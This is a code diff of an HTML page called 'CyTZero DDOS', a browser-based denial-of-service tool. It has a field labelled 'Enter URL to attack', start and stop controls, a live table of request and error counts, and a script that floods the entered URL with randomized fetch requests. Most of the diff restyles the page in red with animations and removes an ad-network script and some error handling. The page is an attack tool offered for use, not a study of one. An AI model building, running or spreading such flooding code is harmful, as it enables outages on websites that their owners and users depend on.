@@ -1,82 +1,127 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script type='text/javascript' src='//pl24703755.profitablecpmrate.com/dc/ec/41/dcec4195ed578104c405647a4c41c87b.js'></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> CyTZero </title>
+    <title>CyTZero</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f4f8; /* Light blue background */
-            color: #333; /* Dark text color for better readability */
+            font-family: 'Arial', sans-serif;
+            background-color: #000; /* Black background */
+            color: #fff; /* White text color */
+            margin: 0;
+            overflow: hidden; /* Prevent scrolling for better animation */
+        }
+
+        /* Background animation */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #8b0000);
+            animation: gradientShift 3s infinite alternate;
+            z-index: -1;
+        }
+
+        @keyframes gradientShift {
+            0% { background: linear-gradient(90deg, #ff0000, #8b0000); }
+            50% { background: linear-gradient(90deg, #8b0000, #ff4500); }
+            100% { background: linear-gradient(90deg, #ff4500, #ff0000); }
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 60px;
+            color: #ff0000; /* Vibrant red title */
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000;
+            margin-top: 50px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000; }
+            50% { text-shadow: 0 0 20px #ff4500, 0 0 30px #ff0000; }
+        }
+
+        #controls {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        input[type="text"] {
+            width: 60%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            box-shadow: 0 0 10px #ff0000;
+            outline: none;
+            background-color: #1a1a1a;
+            color: #fff;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #8b0000; /* Dark red */
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 0 10px #ff0000;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #ff0000;
+            box-shadow: 0 0 20px #ff4500;
+        }
+
+        #stats {
+            width: 80%;
+            margin: auto;
+            color: #ff0000;
+            font-size: 18px;
+            margin-top: 20px;
         }
 
         table {
             width: 100%;
             border-collapse: collapse;
             margin: 20px 0;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
 
         thead {
-            background-color: #007BFF; /* Blue header */
-            color: white; /* White text color for header */
+            background-color: #8b0000; /* Dark red */
+            color: white;
         }
 
-        th,
-        td {
+        th, td {
             text-align: left;
-            padding: 12px; /* Increased padding for a spacious feel */
-            border-bottom: 1px solid #ddd;
+            padding: 12px;
+            border-bottom: 1px solid #333;
         }
 
         tr:nth-child(even) {
-            background-color: #f2f2f2; /* Light grey for even rows */
+            background-color: #1a1a1a; /* Dark gray for even rows */
         }
 
         tr:hover {
-            background-color: #e1f5fe; /* Light blue on hover */
+            background-color: #8b0000; /* Highlight row on hover */
         }
 
-        #stats {
-            width: 80%;
-            margin: auto;
-        }
-
-        div {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-            margin: 20px;
-        }
-
-        input[type="text"] {
-            width: 50%;
-            padding: 10px;
-            margin-right: 10px;
-            border-radius: 5px;
-            margin: 0.5%;
-            border: 1px solid #007BFF; /* Blue border for input */
-        }
-
-        button {
-            padding: 10px 20px;
-            border: none;
-            background-color: #007BFF; /* Blue button */
-            color: white; /* White text */
-            cursor: pointer;
-            margin: 0.5%;
-            border-radius: 5px; /* Rounded corners */
-        }
-
-        button:hover {
-            background-color: #0056b3; /* Darker blue on hover */
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
+    <div class="background"></div>
     <h1>CyTZero DDOS</h1>
     <div id="controls">
         <input type="text" id="urlInput" placeholder="Enter URL to attack" />
@@ -96,7 +141,7 @@
         var floodPromise = null;
 
         function printStats() {
-            statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
+            statsEl.innerHTML = '<table><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
                 Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
                     '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
         }
@@ -115,7 +160,6 @@
                 clearTimeout(id);
                 return response;
             }).catch((error) => {
-                console.log(error.code);
                 clearTimeout(id);
                 throw error;
             });
@@ -130,9 +174,6 @@
                 queue.push(
                     fetchWithTimeout(target + rand, { timeout: 1000 })
                         .catch((error) => {
-                            if (error.code === 20 /* ABORT */) {
-                                return;
-                            }
                             targets[target].number_of_errored_responses++;
                         })
                         .then((response) => {
@@ -178,7 +219,5 @@
             document.getElementById('startBtn').disabled = false;
         });
     </script>
-
-    
 </body>
 </html>
